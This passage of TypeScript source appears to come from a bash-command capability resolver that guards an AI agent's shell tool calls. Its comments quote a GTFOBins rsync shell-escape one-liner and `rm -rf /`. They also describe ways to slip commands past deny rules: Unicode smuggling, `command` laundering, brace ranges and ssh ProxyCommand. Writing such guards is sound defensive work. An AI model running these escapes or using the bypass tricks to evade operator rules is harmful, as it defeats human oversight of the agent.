        consumed.add(next);
        i += 1;
      }
      continue;
    }
    // Short-flag bundles like `-czf`, `-xvf`, `-t`. Iterate
    // characters so combined forms work. `c`/`x`/`t` set mode
    // (first-write wins so `-cf` doesn't get retagged by a later
    // bundle elsewhere on the line); `f` consumes the next
    // non-flag positional as the archive path.
    if (t.startsWith('-') && !t.startsWith('--') && t.length > 1) {
      const bundle = t.slice(1);
      if (mode === 'unknown') {
        if (bundle.includes('c')) mode = 'create';
        else if (bundle.includes('x')) mode = 'extract';
        else if (bundle.includes('t')) mode = 'list';
      }
      if (bundle.includes('f')) {
        const next = tokens[i + 1];
        if (next !== undefined && !next.startsWith('-')) {
          archivePath = next;
          consumed.add(next);
        }
      }
    }
  }

  // Inputs: positionals NOT consumed by -f / -C lookahead.
  const inputs = positional.filter((p) => !consumed.has(p));

  const caps: Capability[] = [];
  if (archivePath !== null && archivePath !== '-') {
    if (mode === 'create') caps.push(writeFs(resolveArg(archivePath, ctx)));
    else caps.push(readFs(resolveArg(archivePath, ctx)));
  }

  if (mode === 'create') {
    for (const p of inputs) caps.push(readFs(resolveArg(p, ctx)));
  } else if (mode === 'extract') {
    const dest = outputDir !== null ? resolveArg(outputDir, ctx) : ctx.cwd;
    caps.push(writeFs(dest));
  } else if (mode === 'unknown') {
    // No mode flag seen — could be anything. Conservative shape.
    return {
      capabilities: [readFs(ctx.cwd), writeFs(ctx.cwd)],
      confidence: 'medium',
    };
  }
  // List mode: archive read already attributed; nothing else.

  if (caps.length === 0) caps.push(readFs(ctx.cwd));

  return { capabilities: caps, confidence: 'medium' };
};

// `ssh [opts] [user@]host [command]` — remote shell.
//
// Static-analyzable surface:
//   - destination host (positional after flag-value consumption)
//   - remote command presence (everything after host that isn't a flag)
//   - port forwarding (-L / -R / -D) → local listener side effect
//   - ProxyCommand (-o ProxyCommand=…) → spawns a LOCAL shell
//
// Capability shape:
//   - net-egress(host) — always
//   - read-fs(~/.ssh) — ssh reads known_hosts + config + keys
//     regardless of `-i` (the §11 classifier on the engine side
//     will catch this and escalate as configured by the operator)
//   - exec:arbitrary — IF a remote command is supplied (the
//     remote side can do anything; from a defense perspective the
//     spawn is dangerous even if it executes elsewhere)
//   - net-ingress(*) — IF -L / -D / -R port forwarding flags
//     present (opens local listener)
//
// Hard refuses:
//   - ProxyCommand in `-o <kv>` or `-oProxyCommand=…`: spawns a
//     LOCAL shell as a side-channel for the SSH connection,
//     ergo arbitrary local exec via an option flag — refuse
//     static analysis the same way cmdInterpreter refuses `-c`.
const cmdSsh: CommandResolver = (_positional, tokens, ctx) => {
  // Slice 125 (R2 P1): `-o LocalCommand=...` (and `-o
  // PermitLocalCommand=yes` paired with `-o LocalCommand=...`)
  // spawns a LOCAL shell as a connection-side hook, exactly like
  // ProxyCommand. KnownHostsCommand also executes a local
  // command on each connect. Refuse all three patterns. Match
  // case-insensitively but report the canonical SSH option name
  // so the operator's modal/log keeps the documented spelling.
  const localExecOpts = ['ProxyCommand', 'LocalCommand', 'KnownHostsCommand'];
  for (const t of tokens) {
    const lower = t.toLowerCase();
    for (const opt of localExecOpts) {
      const needle = `${opt.toLowerCase()}=`;
      if (lower.startsWith(needle) || lower.includes(needle)) {
        return {
          refuse: `ssh: ${opt} option spawns a local command — refusing static analysis`,
        };
      }
    }
  }

  // ssh flag schema. The tree-sitter bash grammar tokenizes numeric
  // literals as `number` nodes and the analyzer DROPS them from
  // `shape.args` (only `word`/`string`/`raw_string`/`concatenation`
  // survive). So a flag whose value is always numeric (`-p 2222`)
  // arrives here as just `['-p', ...next-token...]` — the value is
  // already gone, and a generic "consume next" would eat the WRONG
  // token (the target host). Three flag classes:
  //
  //   - numericValueFlags: value is strictly numeric → stripped from
  //     args → DON'T consume next (it's not the value).
  //   - stringValueFlags: value is always a string (path / kv / host)
  //     → stays in args → peek next; consume if non-flag.
  //   - portForwardFlags: value is `[bind:]port:host:remote_port` for
  //     -L/-R, `[bind:]port` for -D, `local_tun[:remote_tun]` for -w.
  //     Slice 125: `-w` was previously in `numericValueFlags` (bare
  //     `-w 5` form), but the colon-shape `-w 0:1` keeps the value
  //     in shape.args and a host-extractor would otherwise pick
  //     `0:1` as the target. Treat -w like the other port-forward
  //     flags: peek next, consume only when the value contains `:`.
  const numericValueFlags: ReadonlySet<string> = new Set(['-p']);
  const stringValueFlags: ReadonlySet<string> = new Set([
    '-i',
    '-F',
    '-e',
    '-o',
    '-J',
    '-l',
    '-m',
    '-O',
    '-Q',
    '-W',
    '-S',
    '-c',
    '-b',
    '-I',
  ]);
  const portForwardFlags: ReadonlySet<string> = new Set(['-L', '-R', '-D', '-w']);

  let targetIdx = -1;
  let hasPortForward = false;
  for (let i = 0; i < tokens.length; i += 1) {
    const t = tokens[i] ?? '';
    if (numericValueFlags.has(t)) continue; // value already stripped from args
    if (stringValueFlags.has(t)) {
      const next = tokens[i + 1];
      if (next !== undefined && !next.startsWith('-')) i += 1;
      continue;
    }
    if (portForwardFlags.has(t)) {
      hasPortForward = true;
      const next = tokens[i + 1];
      // `:` in next → colon-shaped port-forward spec (consume).
      // No `:` → bare numeric port (stripped) OR the target host
      // (don't consume; let the next iteration pick it as target).
      //
      // Slice 127 (R3 P0-3): for `-w`, the value `any` is the
      // documented ssh syntax ("auto-pick tun device"). It's a
      // word (survives tree-sitter strip) without a colon, so
      // pre-slice it leaked into the target-detection branch as
      // a host → emitted `net-egress:any`. Consume it like a
      // colon-shape spec.
      if (next?.includes(':') || (t === '-w' && next === 'any')) i += 1;
      continue;
    }
    if (t.startsWith('-')) continue;
    targetIdx = i;
    break;
  }

  if (targetIdx === -1) {
    return { refuse: 'ssh: no target host specified' };
  }

  const target = tokens[targetIdx] ?? '';
  // user@host — split on the LAST `@` so user names containing
  // `@` (rare but legal) still yield the right host.
  const atIdx = target.lastIndexOf('@');
  const host = atIdx === -1 ? target : target.slice(atIdx + 1);

  const caps: Capability[] = [netEgress(host || '*'), readFs(resolveArg('~/.ssh', ctx))];

  // Remote command: any non-flag token after the target index.
  const hasRemoteCmd = tokens.slice(targetIdx + 1).some((t) => !t.startsWith('-'));
  if (hasRemoteCmd) caps.push(exec('arbitrary'));

  if (hasPortForward) caps.push(netIngress('*'));

  return { capabilities: caps, confidence: 'medium' };
};

// `scp [opts] SOURCE... DEST` — copy via ssh.
//
// At least one of SOURCE/DEST must be remote (`[user@]host:path`);
// scp doesn't replace cp for local-local copies. We detect remote
// shape by the presence of a `:` before any `/` (Windows-style
// `C:\` shape doesn't appear in scp argv since scp doesn't run
// on Windows native CMD, and even then the colon is after the
// drive letter; here we treat `<text>:<path>` as remote when the
// text part contains no slashes).
//
// Capability shape:
//   - read-fs(~/.ssh) — scp inherits ssh's credential surface
//   - net-egress(host) — for each remote endpoint
//   - read-fs(local source) / write-fs(local dest) — for the
//     local side of the transfer
const cmdScp: CommandResolver = (positional, _tokens, ctx) => {
  if (positional.length < 2) {
    return { refuse: 'scp: needs at least source and destination' };
  }
  // `host:path` shape detection. We only flag as remote when the
  // colon appears BEFORE any `/` — so `local/path:foo` is local
  // (a literal filename containing `:`) but `host:/abs/path` and
  // `user@host:rel` are remote.
  const isRemote = (p: string): boolean => {
    const colon = p.indexOf(':');
    if (colon <= 0) return false;
    return !p.slice(0, colon).includes('/');
  };
  const extractHost = (p: string): string => {
    const left = p.slice(0, p.indexOf(':'));
    const at = left.lastIndexOf('@');
    const host = at === -1 ? left : left.slice(at + 1);
    return host || '*';
  };

  const dest = positional[positional.length - 1] as string;
  const sources = positional.slice(0, -1);
  const caps: Capability[] = [readFs(resolveArg('~/.ssh', ctx))];

  if (isRemote(dest)) {
    caps.push(netEgress(extractHost(dest)));
  } else {
    caps.push(writeFs(resolveArg(dest, ctx)));
  }
  for (const s of sources) {
    if (isRemote(s)) caps.push(netEgress(extractHost(s)));
    else caps.push(readFs(resolveArg(s, ctx)));
  }

  return { capabilities: caps, confidence: 'medium' };
};

// `rsync [opts] SOURCE... DEST` — sync files.
//
// Three transport modes:
//   - local-local (no `:` in any positional)
//   - ssh (one side has `host:path`, default transport)
//   - rsync daemon (one side has `host::module/path`, double colon)
//
// Capability shape:
//   - read-fs(local sources), write-fs(local dest)
//   - net-egress(remote host) for remote endpoints
//   - read-fs(~/.ssh) when ssh transport is in play
//   - delete-fs(local dest) when --delete or any --delete-* flag
//     is present (rsync can delete extraneous files on dest)
const cmdRsync: CommandResolver = (positional, tokens, ctx) => {
  // Slice 125 (R2 P0-2): rsync transport-command flags. `-e <cmd>`
  // and `--rsh=<cmd>` substitute the transport (rsync exec's the
  // literal command string + args locally — GTFOBins reference:
  //   rsync -e 'sh -c "sh -i 1>&0"' 127.0.0.1:
  // is a documented shell escape). `--rsync-path=<cmd>` runs an
  // arbitrary command on the REMOTE side. Pre-slice cmdRsync
  // acknowledged the threat in a comment but did nothing about it
  // — symmetric to ssh's ProxyCommand which slice 120 correctly
  // hard-refused; bringing rsync to parity.
  for (let i = 0; i < tokens.length; i += 1) {
    const t = tokens[i] ?? '';
    if (t === '-e') {
      return {
        refuse:
          'rsync: -e sets the transport command — local shell injection vector, refusing static analysis',
      };
    }
    if (t === '--rsh' || t.startsWith('--rsh=')) {
      return {
        refuse:
          'rsync: --rsh sets the transport command — local shell injection vector, refusing static analysis',
      };
    }
    if (t === '--rsync-path' || t.startsWith('--rsync-path=')) {
      return {
        refuse:
          'rsync: --rsync-path executes an arbitrary command on the remote side — refusing static analysis',
      };
    }
  }

  if (positional.length < 2) {
    return { refuse: 'rsync: needs at least source and destination' };
  }
  const isRemote = (p: string): boolean => {
    const colon = p.indexOf(':');
    if (colon <= 0) return false;
    return !p.slice(0, colon).includes('/');
  };
  const extractHost = (p: string): string => {
    const left = p.slice(0, p.indexOf(':'));
    const at = left.lastIndexOf('@');
    const host = at === -1 ? left : left.slice(at + 1);
    return host || '*';
  };
  // `--delete`, `--delete-after`, `--delete-before`, etc. all enable
  // destination deletion.
  const hasDelete = tokens.some((t) => t === '--delete' || t.startsWith('--delete-'));

  // Slice 127 (R3 P1): `--password-file=<path>` reads daemon
  // credentials from <path>. Pre-slice the resolver attributed
  // no read-fs for this; operator allow rules on ~/.aws/passwords
  // or similar credential files never fired. Detect both `=`
  // and space-separated forms.
  let passwordFile: string | null = null;
  for (let i = 0; i < tokens.length; i += 1) {
    const t = tokens[i] ?? '';
    if (t.startsWith('--password-file=')) {
      passwordFile = t.slice('--password-file='.length);
      break;
    }
    if (t === '--password-file') {
      const next = tokens[i + 1];
      if (next !== undefined && !next.startsWith('-')) passwordFile = next;
      break;
    }
  }

  const dest = positional[positional.length - 1] as string;
  const sources = positional.slice(0, -1);
  const anyRemote = isRemote(dest) || sources.some(isRemote);

  const caps: Capability[] = [];
  if (anyRemote) caps.push(readFs(resolveArg('~/.ssh', ctx)));
  if (passwordFile !== null) caps.push(readFs(resolveArg(passwordFile, ctx)));

  if (isRemote(dest)) {
    caps.push(netEgress(extractHost(dest)));
  } else {
    caps.push(writeFs(resolveArg(dest, ctx)));
    if (hasDelete) caps.push(deleteFs(resolveArg(dest, ctx)));
  }
  for (const s of sources) {
    if (isRemote(s)) caps.push(netEgress(extractHost(s)));
    else caps.push(readFs(resolveArg(s, ctx)));
  }

  return { capabilities: caps, confidence: 'medium' };
};

// `make [target...]` — runs recipes from a Makefile. Recipes are
// arbitrary shell; even `make help` may execute a recipe with
// side effects. We don't try to parse the Makefile — exec:arbitrary
// is the honest capability shape, matching the cmdInterpreter
// pattern for "this runs untrusted code".
const cmdMake: CommandResolver = (_positional, _tokens, ctx) => {
  return {
    capabilities: [exec('arbitrary'), readFs(ctx.cwd), writeFs(ctx.cwd)],
    confidence: 'medium',
  };
};

// `cargo <subcommand> ...` — Rust toolchain. Subcommand-aware
// because the capability shape varies dramatically.
//
// Read-only / inspection subcommands (`tree`, `metadata`, `pkgid`,
// `help`, `--version` / `-V`) — just read-fs(cwd).
//
// `search` reaches crates.io but doesn't build.
//
// Credential subcommands (`publish`, `login`, `yank`, `owner`) —
// read ~/.cargo/credentials.toml + net-egress crates.io. No
// build.rs exec since these don't compile.
//
// Build / run / test / check / install / fetch — these can all
// execute `build.rs` arbitrary code. Cargo also writes the
// `target/` dir under cwd and reaches crates.io for deps.
const cmdCargo: CommandResolver = (positional, tokens, ctx) => {
  const sub = positional[0];
  // Slice 125 (R2 P1): `--target-dir=<path>` and `--target-dir <path>`
  // redirect the build output dir. When present, the write-fs scope
  // moves from `<cwd>/target` to that path.
  let targetDir: string | null = null;
  for (let i = 0; i < tokens.length; i += 1) {
    const t = tokens[i] ?? '';
    if (t.startsWith('--target-dir=')) {
      targetDir = t.slice('--target-dir='.length);
    } else if (t === '--target-dir') {
      const next = tokens[i + 1];
      if (next !== undefined && !next.startsWith('-')) targetDir = next;
    }
  }
  const buildOutputDir =
    targetDir !== null ? resolveArg(targetDir, ctx) : resolvePath(ctx.cwd, 'target');

  if (
    sub === 'tree' ||
    sub === 'metadata' ||
    sub === 'pkgid' ||
    sub === 'help' ||
    sub === '--version' ||
    sub === '-V'
  ) {
    return { capabilities: [readFs(ctx.cwd)], confidence: 'high' };
  }
  if (sub === 'search') {
    return {
      capabilities: [netEgress('crates.io'), readFs(ctx.cwd)],
      confidence: 'high',
    };
  }
  if (sub === 'publish' || sub === 'login' || sub === 'yank' || sub === 'owner') {
    return {
      capabilities: [readFs(ctx.cwd), readFs(resolveArg('~/.cargo', ctx)), netEgress('crates.io')],
      confidence: 'medium',
    };
  }
  // Slice 125 (R2 P1): `cargo clean` removes the build output dir.
  // Pre-slice it fell into the default branch and emitted write-fs
  // (alongside exec:arbitrary). The honest shape is delete-fs on
  // the target dir; no exec:arbitrary because clean doesn't compile.
  if (sub === 'clean') {
    return {
      capabilities: [deleteFs(buildOutputDir), readFs(ctx.cwd)],
      confidence: 'high',
    };
  }
  return {
    capabilities: [
      exec('arbitrary'),
      readFs(ctx.cwd),
      writeFs(buildOutputDir),
      netEgress('crates.io'),
    ],
    confidence: 'medium',
  };
};

const COMMAND_TABLE: ReadonlyMap<string, CommandResolver> = new Map<string, CommandResolver>([
  ['ls', cmdRead],
  ['cat', cmdRead],
  ['head', cmdRead],
  ['tail', cmdRead],
  ['wc', cmdRead],
  ['file', cmdRead],
  ['stat', cmdRead],
  ['pwd', cmdRead],
  ['echo', cmdEcho],
  ['printf', cmdEcho],
  ['grep', cmdGrep],
  ['rg', cmdGrep],
  ['find', cmdFind],
  ['rm', cmdRm],
  ['rmdir', cmdRm],
  ['mv', cmdMvCp],
  ['cp', cmdMvCp],
  ['curl', cmdCurlWget],
  ['wget', cmdCurlWget],
  ['git', cmdGit],
  ['gh', cmdGit],
  ['npm', cmdNpmLike],
  ['yarn', cmdNpmLike],
  ['bun', cmdNpmLike],
  ['pip', cmdPip],
  ['pip3', cmdPip],
  ['pnpm', cmdNpmLike],
  ['chmod', cmdChmodChown],
  ['chown', cmdChmodChown],
  ['python', cmdInterpreter],
  ['python3', cmdInterpreter],
  ['node', cmdInterpreter],
  ['ruby', cmdInterpreter],
  ['perl', cmdInterpreter],
  // Filesystem-mutating builtins / utilities
  ['mkdir', cmdMkdir],
  ['touch', cmdMkdir],
  ['ln', cmdMkdir],
  ['mktemp', cmdMkdir],
  // No-op / shell-level builtins
  ['sleep', cmdNoOp],
  ['true', cmdNoOp],
  ['false', cmdNoOp],
  // System-info / identity / lookup
  ['whoami', cmdSysInfo],
  ['id', cmdSysInfo],
  ['groups', cmdSysInfo],
  ['hostname', cmdSysInfo],
  ['uname', cmdSysInfo],
  ['uptime', cmdSysInfo],
  ['date', cmdSysInfo],
  ['env', cmdSysInfo],
  ['printenv', cmdSysInfo],
  ['which', cmdSysInfo],
  ['type', cmdSysInfo],
  // `command` removed slice 128 (R4 P0-Launder-1) — now hard-refused
  // via HARD_REFUSE_COMMANDS. Was treating `command` as a noop
  // sysinfo verb, silently laundering capability attribution for
  // the actual command it ran.
  // Navigation (no persistent side-effect across tool calls)
  ['cd', cmdCd],
  // Slice 120 — archive / remote / build (R2 #199)
  ['tar', cmdTar],
  ['tee', cmdTee],
  ['ssh', cmdSsh],
  ['scp', cmdScp],
  ['rsync', cmdRsync],
  ['make', cmdMake],
  ['cargo', cmdCargo],
]);

// ─── AST walk ──────────────────────────────────────────────

interface CommandShape {
  name: string;
  args: string[];
  redirects: RedirectShape[];
}

interface RedirectShape {
  kind: 'out' | 'append' | 'in' | 'both' | 'force-out';
  target: string;
}

// Tree-sitter exposes anonymous nodes whose `type` is the literal
// punctuation text. They show up as children of `command` /
// `pipeline` / `list` and don't carry semantics beyond delimitation
// — anchor for grouping.
const isPunctuationType = (t: string): boolean =>
  t === '|' ||
  t === '||' ||
  t === '&&' ||
  t === ';' ||
  t === '&' ||
  t === '>' ||
  t === '>>' ||
  t === '<' ||
  t === '>|' ||
  t === '&>' ||
  t === '&>>' ||
  t === '"' ||
  t === "'";

// Codepoint ranges that smuggle non-ASCII tokens past byte-equality
// checks (slice 98, R2 #196). The tree-sitter bash grammar tokenizes
// strictly on bytes — fullwidth `；` (U+FF1B) parses as a `word`
// child, NOT as a `;` punctuation node, so a deny pattern matching
// the literal `';'` is silently bypassed; same for zero-width
// joiners hidden inside command names (`gi‍t status` reads as
// `git status` to a human and to most rendering layers but is a
// different byte sequence to the resolver), and bidi overrides
// (U+202E reverses display order, so an adversarial source line
// looks like `cat README` while executing `rm -rf /`).
//
// Defense: refuse any literal carrying these codepoints. The
// resolver's `Refuse` outcome short-circuits the call with a stable
// reason — operators can author rules against the recognized
// shape, and the LLM gets an explicit error rather than a silent
// success on the wrong literal. ASCII-only is the right boundary:
// non-ASCII filenames are legitimate (UTF-8 paths exist), but they
// MUST go through the operator's modal where the literal is
// previewed in full; bypassing rule matching on the resolver side
// would erase that intervention.
const isFullwidthAscii = (cp: number): boolean => cp >= 0xff00 && cp <= 0xffef;
const isZeroWidth = (cp: number): boolean =>
  cp === 0x200b ||
  cp === 0x200c ||
  cp === 0x200d ||
  cp === 0xfeff ||
  cp === 0x2060 ||
  cp === 0x180e;
const isBidiOverride = (cp: number): boolean =>
  (cp >= 0x202a && cp <= 0x202e) || (cp >= 0x2066 && cp <= 0x2069);
const isC1Control = (cp: number): boolean => cp >= 0x0080 && cp <= 0x009f;

const containsUnicodeBypass = (text: string): boolean => {
  for (const ch of text) {
    const cp = ch.codePointAt(0);
    if (cp === undefined) continue;
    if (isFullwidthAscii(cp) || isZeroWidth(cp) || isBidiOverride(cp) || isC1Control(cp)) {
      return true;
    }
  }
  return false;
};

// Extracts the literal text of a `word`, `string`, `raw_string`, or
// `concatenation` node. Returns null when the node carries embedded
// expansion / substitution — those should already have been refused
// by the whitelist walk; this is a defensive secondary check.
//
// Unicode-bypass check (slice 98, R2 #196): every extracted literal
// runs `containsUnicodeBypass`. A match returns null, surfaced by
// the walker as `bash_shape_not_recognized: dynamic content inside
// string arg` — same refuse semantics as embedded substitution.
const literalText = (node: Node): string | null => {
  let raw: string;
  if (node.type === 'word' || node.type === 'raw_string') {
    raw = node.text;
  } else if (node.type === 'string') {
    // string can contain string_content children and optional
    // string_expansion / command_substitution. If any of those red-
    // flag children exist we refuse upstream — here we just join the
    // text content directly.
    for (const child of node.children) {
      if (child !== null && RED_FLAG_NODES.has(child.type)) return null;
    }
    // strip surrounding quotes; tree-sitter includes them as children
    raw = node.text.replace(/^["']|["']$/g, '');
  } else if (node.type === 'concatenation') {
    let acc = '';
    for (const child of node.children) {
      if (child === null) continue;
      const inner = literalText(child);
      if (inner === null) return null;
      acc += inner;
    }
    return acc;
  } else {
    return null;
  }
  if (containsUnicodeBypass(raw)) return null;
  return raw;
};

// Map a `file_redirect` node's operator + target into a RedirectShape.
// Returns null on shapes the resolver can't normalize.
const redirectShape = (node: Node): RedirectShape | null => {
  let kind: RedirectShape['kind'] | null = null;
  let target: string | null = null;
  for (const child of node.children) {
    if (child === null) continue;
    if (child.type === '>') kind = 'out';
    else if (child.type === '>>') kind = 'append';
    else if (child.type === '<') kind = 'in';
    else if (child.type === '&>' || child.type === '&>>') kind = 'both';
    else if (child.type === '>|') kind = 'force-out';
    else if (child.type === 'word' || child.type === 'string' || child.type === 'raw_string') {
      target = literalText(child);
    }
  }
  if (kind === null || target === null) return null;
  return { kind, target };
};

interface WalkResult {
  // Either a list of CommandShape objects (the AST decomposed into
  // per-command tuples) or a Refuse reason. Walk is short-circuited
  // on the first refusal — adversarial constructs anywhere in the
  // script refuse the whole script, since the whole thing executes
  // as one bash invocation.
  commands?: CommandShape[];
  refuse?: string;
}

// Recursion depth ceiling for `walkAst` (slice 98, R2 #198). A
// pathologically nested input — say, 10,000 levels of brace groups
// `{{{ ... }}}` — would otherwise blow the JS stack on `visit`'s
// recursive call into children, taking down the engine before the
// resolver could refuse with a structured envelope. 64 is well
// above legitimate shell shapes (the deepest realistic real-world
// pipeline is ~8 levels) and well below the Node 24 default
// stack budget (which permits ~1500 deep recursion in practice
// but varies by build). Refuse with a stable reason so audit /
// modal can surface the cause cleanly.
const MAX_AST_DEPTH = 64;

// Walk the AST starting at the program root. Validates every node
// against WHITELIST_NODE_TYPES and RED_FLAG_NODES; decomposes
// `command` nodes into shapes.
const walkAst = (root: Node): WalkResult => {
  const commands: CommandShape[] = [];
  const visit = (node: Node, depth: number): string | null => {
    if (depth > MAX_AST_DEPTH) {
      return `bash_shape_not_recognized: ast_depth_exceeded (>${MAX_AST_DEPTH})`;
    }
    // Red-flag check first — beats whitelist if a node is both
    // (e.g. expansion that happens to be enumerated in whitelist).
    const redFlag = RED_FLAG_NODES.get(node.type);
    if (redFlag !== undefined) {
      return `bash_shape_not_recognized: ${redFlag}`;
    }
    // Skip ERROR nodes — tree-sitter recovers from parse errors and
    // emits ERROR placeholders. Anything error-recovered is by
    // definition outside the whitelist.
    if (node.type === 'ERROR' || node.isError) {
      return `bash_shape_not_recognized: parse_error at ${node.startPosition.row}:${node.startPosition.column}`;
    }
    if (isPunctuationType(node.type)) return null;
    if (!WHITELIST_NODE_TYPES.has(node.type)) {
      return `bash_shape_not_recognized: ${node.type}`;
    }
    // Decompose `command` nodes into shapes.
    if (node.type === 'command') {
      const shape: CommandShape = { name: '', args: [], redirects: [] };
      for (const child of node.children) {
        if (child === null) continue;
        if (child.type === 'command_name') {
          // command_name wraps a single `word` (per grammar).
          const inner = child.namedChild(0) ?? child.children[0];
          if (inner === null || inner === undefined) {
            return 'bash_shape_not_recognized: empty command_name';
          }
          const text = literalText(inner);
          if (text === null) {
            return `bash_shape_not_recognized: dynamic command_name (${inner.type})`;
          }
          shape.name = text;
        } else if (
          child.type === 'word' ||
          child.type === 'string' ||
          child.type === 'raw_string' ||
          child.type === 'concatenation'
        ) {
          const text = literalText(child);
          if (text === null) {
            return 'bash_shape_not_recognized: dynamic content inside string arg';
          }
          shape.args.push(text);
        } else if (child.type === 'file_redirect') {
          const r = redirectShape(child);
          if (r === null) {
            return 'bash_shape_not_recognized: redirect target is non-literal';
          }
          shape.redirects.push(r);
        } else if (!isPunctuationType(child.type)) {
          // Recurse into red-flag check / unknown.
          const refuse = visit(child, depth + 1);
          if (refuse !== null) return refuse;
        }
      }
      if (shape.name === '') {
        return 'bash_shape_not_recognized: command without name';
      }
      commands.push(shape);
      return null;
    }
    // For `redirected_statement`, its first child is usually a
    // command and the rest are file_redirects. Treat them inline.
    if (node.type === 'redirected_statement') {
      // Walk children — the command will register itself, and the
      // file_redirects need to be merged into the most recently
      // pushed command.
      const before = commands.length;
      for (const child of node.children) {
        if (child === null) continue;
        const refuse = visit(child, depth + 1);
        if (refuse !== null) return refuse;
      }
      // Merge any file_redirects that appeared as siblings into the
      // last command.
      const lastCmd = commands[commands.length - 1];
      if (lastCmd !== undefined && commands.length > before) {
        for (const child of node.children) {
          if (child !== null && child.type === 'file_redirect') {
            const r = redirectShape(child);
            if (
              r !== null &&
              !lastCmd.redirects.some((x) => x.kind === r.kind && x.target === r.target)
            ) {
              lastCmd.redirects.push(r);
            }
          }
        }
      }
      return null;
    }
    // For `program` / `list` / `pipeline` / `string` / etc. just
    // recurse into children — the walk validates each level.
    for (const child of node.children) {
      if (child === null) continue;
      const refuse = visit(child, depth + 1);
      if (refuse !== null) return refuse;
    }
    return null;
  };

  const refuse = visit(root, 0);
  if (refuse !== null) return { refuse };
  return { commands };
};

// Detect pipe-to-shell on a `pipeline` node. Returns the offending
// stage name when found.
const detectPipeToShell = (root: Node): string | null => {
  const pipelines = root.descendantsOfType('pipeline');
  for (const pipeline of pipelines) {
    const stages = pipeline.children.filter((c) => c !== null && c.type === 'command') as Node[];
    if (stages.length < 2) continue;
    const last = stages[stages.length - 1];
    if (last === undefined) continue;
    const nameNode = last.childForFieldName('name') ?? last.namedChild(0);
    if (nameNode === null || nameNode === undefined) continue;
    const text = literalText(nameNode.children[0] ?? nameNode) ?? nameNode.text;
    if (SHELL_INTERPRETERS.has(text)) return text;
  }
  return null;
};

// ─── Per-command analysis ──────────────────────────────────

const isReadOnlyCommand = (name: string): boolean => {
  switch (name) {
    case 'ls':
    case 'cat':
    case 'head':
    case 'tail':
    case 'wc':
    case 'file':
    case 'stat':
    case 'pwd':
    case 'grep':
    case 'rg':
    case 'find':
      return true;
    default:
      return false;
  }
};

// Pure-output commands: their positional args are literal strings
// emitted to stdout, not paths. The per-arg protected-path loop is
// skipped for these. Redirects are still inspected separately
// because `echo hi > /etc/foo` does write to /etc/foo regardless
// of which command produced the bytes.
const isPureOutputCommand = (name: string): boolean => name === 'echo' || name === 'printf';

// Slice 125 (R2 P0-3): shell brace + glob expansion helpers.
// Bash's brace expansion (`{a,b}`) is FS-INDEPENDENT — the shell
// expands deterministically before exec. Glob expansion (`*`, `?`,
// `[`) is FS-dependent — runs at exec time against the live FS.
// The resolver can pre-expand braces safely; for globs the best
// we can do is detect the literal prefix and refuse if it could
// lead into a protected zone.

const GLOB_METACHAR_RE = /[*?[]/;

const containsGlobMetachar = (s: string): boolean => GLOB_METACHAR_RE.test(s);

// Extract the literal prefix of a glob pattern — everything before
// the first `*`/`?`/`[`/`{`. Used to compare against protected
// zone roots without resolving runtime glob expansion.
const globLiteralPrefix = (arg: string): string => {
  for (let i = 0; i < arg.length; i += 1) {
    const c = arg[i];
    if (c === '*' || c === '?' || c === '[' || c === '{') return arg.slice(0, i);
  }
  return arg;
};

// Expand brace patterns deterministically. Supports comma lists
// `{a,b,c}` with arbitrary nesting. Numeric / character ranges
// (`{1..5}`, `{a..z}`) are NOT expanded — those rely on bash-
// specific semantics; we return [arg] unchanged for safety
// (caller's classifier still handles literal prefix). A pattern
// with mismatched braces returns [arg] as-is.
//
// Hard cap on expansion count: 1024 results. Beyond that we
// abandon expansion to avoid pathological inputs like
// `{a,b}{a,b}{a,b}...` exploding factorially. Caller treats this
// as "could be anything"; combine with the glob-metachar refuse
// path for safety.
const MAX_BRACE_EXPANSIONS = 1024;
const expandBraces = (arg: string): string[] => {
  const out: string[] = [];
  const visit = (s: string): void => {
    if (out.length >= MAX_BRACE_EXPANSIONS) return;
    const open = s.indexOf('{');
    if (open === -1) {
      out.push(s);
      return;
    }
    // Find matching close, tracking nesting.
    let depth = 1;
    let close = -1;
    for (let i = open + 1; i < s.length; i += 1) {
      const c = s[i];
      if (c === '{') depth += 1;
      else if (c === '}') {
        depth -= 1;
        if (depth === 0) {
          close = i;
          break;
        }
      }
    }
    if (close === -1) {
      out.push(s);
      return;
    }
    const middle = s.slice(open + 1, close);
    // Split top-level commas (ignore commas inside nested braces).
    const parts: string[] = [];
    let nested = 0;
    let last = 0;
    for (let i = 0; i < middle.length; i += 1) {
      const c = middle[i];
      if (c === '{') nested += 1;
      else if (c === '}') nested -= 1;
      else if (c === ',' && nested === 0) {
        parts.push(middle.slice(last, i));
        last = i + 1;
      }
    }
    parts.push(middle.slice(last));
    const prefix = s.slice(0, open);
    const suffix = s.slice(close + 1);
    if (parts.length < 2) {
      // Slice 127 (R3 P1): single-element brace MAY be a range
      // (`{a..z}`, `{1..10}`). Bash expands these deterministically
      // — `rm /e{a..z}c/passwd` includes `/etc/passwd`. Pre-slice
      // we emitted the literal which doesn't classify as protected.
      // Detect single-char `start..end` and integer `start..end`
      // (no step support; bash's `..N` step is rare in agent code).
      const rangeMatch = middle.match(/^(.+?)\.\.(.+?)$/);
      if (rangeMatch !== null) {
        const [, start, end] = rangeMatch as [string, string, string];
        const startNum = Number.parseInt(start, 10);
        const endNum = Number.parseInt(end, 10);
        // Integer range.
        if (
          start === String(startNum) &&
          end === String(endNum) &&
          Number.isFinite(startNum) &&
          Number.isFinite(endNum)
        ) {
          const lo = Math.min(startNum, endNum);
          const hi = Math.max(startNum, endNum);
          // Cap iteration via the global MAX_BRACE_EXPANSIONS
          // check inside the loop; large ranges fall through to
          // the literal-prefix glob defense.
          for (let v = lo; v <= hi; v += 1) {
            visit(prefix + String(v) + suffix);
            if (out.length >= MAX_BRACE_EXPANSIONS) return;
          }
          return;
        }
        // Single-char range — bash semantics: `{a..z}` expands
        // 26 chars. Multi-char endpoints stay literal.
        if (start.length === 1 && end.length === 1) {
          const lo = Math.min(start.charCodeAt(0), end.charCodeAt(0));
          const hi = Math.max(start.charCodeAt(0), end.charCodeAt(0));
          for (let v = lo; v <= hi; v += 1) {
            visit(prefix + String.fromCharCode(v) + suffix);
            if (out.length >= MAX_BRACE_EXPANSIONS) return;
          }
          return;
        }
        // Malformed range (e.g., `aa..zz`, mixed types) — fall
        // through to literal; glob-metachar branch picks it up.
      }
      out.push(s);
      return;
    }
    for (const p of parts) {
      visit(prefix + p + suffix);
      if (out.length >= MAX_BRACE_EXPANSIONS) return;
    }
  };
  visit(arg);
  return out;
};

// Test whether a literal-prefix path could reach any SYSTEM-level
// protected target via glob expansion. True iff some protected
